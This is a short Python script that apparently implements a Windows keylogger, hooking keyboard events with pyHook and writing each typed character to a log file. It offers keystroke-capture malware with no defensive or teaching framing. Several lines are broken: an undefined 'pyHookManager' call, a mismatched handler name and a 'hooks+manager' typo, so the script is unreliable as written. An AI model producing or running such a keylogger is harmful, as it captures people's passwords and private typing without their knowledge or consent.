import pyHook, pythoncom, logging
logging.basicConfig(filename='mylogfile.txt', level=logging.DEBUG, format='%(message)s')

def OnKeyboardEvent(event):
	logging.log(logging.DEBUG, chr(event.Ascii))
	return True

hooks_manager = pyHookManager()
hooks_manager.KeyDown = OnkeyboardEvent
hooks+manager.HookKeyboard()
pythoncom.PumpMessages()
